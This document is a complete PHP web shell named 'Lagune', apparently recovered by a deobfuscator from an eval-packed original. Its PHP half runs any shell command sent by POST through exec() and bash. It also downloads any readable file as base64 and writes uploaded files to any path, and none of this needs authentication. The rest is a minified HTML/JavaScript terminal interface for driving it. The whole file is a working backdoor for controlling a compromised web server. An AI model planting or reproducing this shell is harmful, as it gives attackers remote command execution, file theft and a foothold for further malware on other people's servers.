<?php

/* #1: PHPDeobfuscator eval output */ 
    function featureShell($cmd, $cwd)
    {
        $stdout = array();
        if (preg_match("/^\\s*cd\\s*\$/", $cmd)) {
        } elseif (preg_match("/^\\s*cd\\s+(.+)\\s*(2>&1)?\$/", $cmd)) {
            chdir($cwd);
            preg_match("/^\\s*cd\\s+([^\\s]+)\\s*(2>&1)?\$/", $cmd, $match);
            chdir($match[1]);
        } elseif (preg_match("/^\\s*download\\s+[^\\s]+\\s*(2>&1)?\$/", $cmd)) {
            chdir($cwd);
            preg_match("/^\\s*download\\s+([^\\s]+)\\s*(2>&1)?\$/", $cmd, $match);
            return featureDownload($match[1]);
        } else {
            chdir($cwd);
            exec($cmd, $stdout);
        }
        return array("stdout" => $stdout, "cwd" => getcwd());
    }
    function featurePwd()
    {
        return array("cwd" => getcwd());
    }
    function featureHint($fileName, $cwd, $type)
    {
        chdir($cwd);
        if ($type == "cmd") {
            $cmd = "compgen -c {$fileName}";
        } else {
            $cmd = "compgen -f {$fileName}";
        }
        $cmd = "/bin/bash -c \"{$cmd}\"";
        $files = explode("\n", shell_exec($cmd));
        return array("files" => $files);
    }
    function featureDownload($filePath)
    {
        $file = @file_get_contents($filePath);
        if ($file === FALSE) {
            return array("stdout" => array("File not found / no read permission."), "cwd" => getcwd());
        } else {
            return array("name" => basename($filePath), "file" => base64_encode($file));
        }
    }
    function featureUpload($path, $file, $cwd)
    {
        chdir($cwd);
        $f = @fopen($path, "wb");
        if ($f === FALSE) {
            return array("stdout" => array("Invalid path / no write permission."), "cwd" => getcwd());
        } else {
            fwrite($f, base64_decode($file));
            fclose($f);
            return array("stdout" => array("Done."), "cwd" => getcwd());
        }
    }
    if (isset($_GET["feature"])) {
        $response = NULL;
        switch ($_GET["feature"]) {
            case "shell":
                $cmd = $_POST["cmd"];
                if (!preg_match("/2>/", $cmd)) {
                    $cmd .= " 2>&1";
                }
                $response = featureShell($cmd, $_POST["cwd"]);
                break;
            case "pwd":
                $response = featurePwd();
                break;
            case "hint":
                $response = featureHint($_POST["filename"], $_POST["cwd"], $_POST["type"]);
                break;
            case "upload":
                $response = featureUpload($_POST["path"], $_POST["file"], $_POST["cwd"]);
        }
        header("Content-Type: application/json");
        echo json_encode($response);
        die;
    }
    ?>
<!doctypehtml><html><head><meta charset="UTF-8"><title>Lagune</title><meta content="width=device-width,initial-scale=1"name="viewport"><style>body,html{margin:0;padding:0;height:100%;position:relative;background:#333;background-image:url(https://wallpapercave.com/wp/wp1810645.jpg);background-position:center;background-repeat:no-repeat;background-size:cover;color:#eee;font-family:monospace}::-webkit-scrollbar-track{border-radius:8px;background-color:#353535}::-webkit-scrollbar{width:8px;height:8px}::-webkit-scrollbar-thumb{border-radius:8px;-webkit-box-shadow:inset 0 0 6px rgba(0,0,0,.3);background-color:#bcbcbc}#shell{background:rgba(34,34,34,.9);max-width:800px;margin:50px auto 0 auto;box-shadow:0 0 5px rgba(0,0,0,.3);font-size:10pt;display:flex;flex-direction:column;align-items:stretch}#shell-content{height:500px;overflow:auto;padding:5px;white-space:pre-wrap;flex-grow:1}#shell-logo{font-weight:700;color:#75df0b;text-align:center}@media (max-width:991px){#shell-logo{font-size:6px;margin:-25px 0}#shell,body,html{height:100%;width:100%;max-width:none}#shell{margin-top:0}}@media (max-width:767px){#shell-input{flex-direction:column}}@media (max-width:320px){#shell-logo{font-size:5px}}.shell-prompt{font-weight:700;color:#75df0b}.shell-prompt>span{color:#1bc9e7}#shell-input{display:flex;box-shadow:0 -1px 0 rgba(0,0,0,.3);border-top:rgba(255,255,255,.05) solid 1px}#shell-input>label{flex-grow:0;display:block;padding:0 5px;height:30px;line-height:30px}#shell-input #shell-cmd{height:30px;line-height:30px;border:none;background:0 0;color:#eee;font-family:monospace;font-size:10pt;width:100%;align-self:center}#shell-input div{flex-grow:1;align-items:stretch}#shell-input input{outline:0}</style><script>var CWD=null,commandHistory=[],historyPosition=0,eShellCmdInput=null,eShellContent=null;function _insertCommand(e){eShellContent.innerHTML+="\n\n",eShellContent.innerHTML+='<span class="shell-prompt">'+genPrompt(CWD)+"</span> ",eShellContent.innerHTML+=escapeHtml(e),eShellContent.innerHTML+="\n",eShellContent.scrollTop=eShellContent.scrollHeight}function _insertStdout(e){eShellContent.innerHTML+=escapeHtml(e),eShellContent.scrollTop=eShellContent.scrollHeight}function _defer(e){setTimeout(e,0)}function featureShell(e){_insertCommand(e),/^\s*upload\s+[^\s]+\s*$/.test(e)?featureUpload(e.match(/^\s*upload\s+([^\s]+)\s*$/)[1]):/^\s*clear\s*$/.test(e)?eShellContent.innerHTML="":makeRequest("?feature=shell",{cmd:e,cwd:CWD},function(e){e.hasOwnProperty("file")?featureDownload(e.name,e.file):(_insertStdout(e.stdout.join("\n")),updateCwd(e.cwd))})}function featureHint(){if(0!==eShellCmdInput.value.trim().length){var e=eShellCmdInput.value.split(" "),n=1===e.length?"cmd":"file";makeRequest("?feature=hint",{filename:"cmd"==n?e[0]:e[e.length-1],cwd:CWD,type:n},function(e){if(!(e.files.length<=1))if(2===e.files.length)if("cmd"==n)eShellCmdInput.value=e.files[0];else{var t=eShellCmdInput.value;eShellCmdInput.value=t.replace(/([^\s]*)$/,e.files[0])}else _insertCommand(eShellCmdInput.value),_insertStdout(e.files.join("\n"))})}}function featureDownload(e,t){var n=document.createElement("a");n.setAttribute("href","data:application/octet-stream;base64,"+t),n.setAttribute("download",e),n.style.display="none",document.body.appendChild(n),n.click(),document.body.removeChild(n),_insertStdout("Done.")}function featureUpload(t){var e=document.createElement("input");e.setAttribute("type","file"),e.style.display="none",document.body.appendChild(e),e.addEventListener("change",function(){getBase64(e.files[0]).then(function(e){makeRequest("?feature=upload",{path:t,file:e,cwd:CWD},function(e){_insertStdout(e.stdout.join("\n")),updateCwd(e.cwd)})},function(){_insertStdout("An unknown client-side error occurred.")})}),e.click(),document.body.removeChild(e)}function getBase64(o,e){return new Promise(function(e,t){var n=new FileReader;n.onload=function(){e(n.result.match(/base64,(.*)$/)[1])},n.onerror=t,n.readAsDataURL(o)})}function genPrompt(e){var t=e=e||"~";if(3<e.split("/").length){var n=e.split("/");t="…/"+n[n.length-2]+"/"+n[n.length-1]}return'lagune <span title="'+e+'">'+t+"</span>:~# "}function updateCwd(e){if(e)return CWD=e,void _updatePrompt();makeRequest("?feature=pwd",{},function(e){CWD=e.cwd,_updatePrompt()})}function escapeHtml(e){return e.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")}function _updatePrompt(){document.getElementById("shell-prompt").innerHTML=genPrompt(CWD)}function _onShellCmdKeyDown(e){switch(e.key){case"Enter":featureShell(eShellCmdInput.value),insertToHistory(eShellCmdInput.value),eShellCmdInput.value="";break;case"ArrowUp":0<historyPosition&&(historyPosition--,eShellCmdInput.blur(),eShellCmdInput.value=commandHistory[historyPosition],_defer(function(){eShellCmdInput.focus()}));break;case"ArrowDown":if(historyPosition>=commandHistory.length)break;++historyPosition===commandHistory.length?eShellCmdInput.value="":(eShellCmdInput.blur(),eShellCmdInput.focus(),eShellCmdInput.value=commandHistory[historyPosition]);break;case"Tab":e.preventDefault(),featureHint()}}function insertToHistory(e){commandHistory.push(e),historyPosition=commandHistory.length}function makeRequest(e,n,t){var o=new XMLHttpRequest;o.open("POST",e,!0),o.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),o.onreadystatechange=function(){if(4===o.readyState&&200===o.status)try{var e=JSON.parse(o.responseText);t(e)}catch(e){alert("Error while parsing response: "+e)}},o.send(function(){var e=[];for(var t in n)n.hasOwnProperty(t)&&e.push(encodeURIComponent(t)+"="+encodeURIComponent(n[t]));return e.join("&")}())}document.onclick=function(e){e=e||window.event;var t=window.getSelection();"SELECT"!==(e.target||e.srcElement).tagName&&(t.toString()||eShellCmdInput.focus())},window.onload=function(){eShellCmdInput=document.getElementById("shell-cmd"),eShellContent=document.getElementById("shell-content"),updateCwd(),eShellCmdInput.focus()}</script></head><body><br><br><br><br><br><br><br><br><div id="shell"><pre id="shell-content">
                <div id="shell-logo"><span></span>
 ___       ________  ________  ___  ___  ________   _______      
|\  \     |\   __  \|\   ____\|\  \|\  \|\   ___  \|\  ___ \     
\ \  \    \ \  \|\  \ \  \___|\ \  \\\  \ \  \\ \  \ \   __/|    
 \ \  \    \ \   __  \ \  \  __\ \  \\\  \ \  \\ \  \ \  \_|/__  
  \ \  \____\ \  \ \  \ \  \|\  \ \  \\\  \ \  \\ \  \ \  \_|\ \ 
   \ \_______\ \__\ \__\ \_______\ \_______\ \__\\ \__\ \_______\
    \|_______|\|__|\|__|\|_______|\|_______|\|__| \|__|\|_______|
                
                </div>
            </pre><div id="shell-input"><label class="shell-prompt"for="shell-cmd"id="shell-prompt">???</label><div><input id="shell-cmd"name="cmd"onkeydown="_onShellCmdKeyDown(event)"></div></div></div></body></htm<?php 
/* END:#1 */
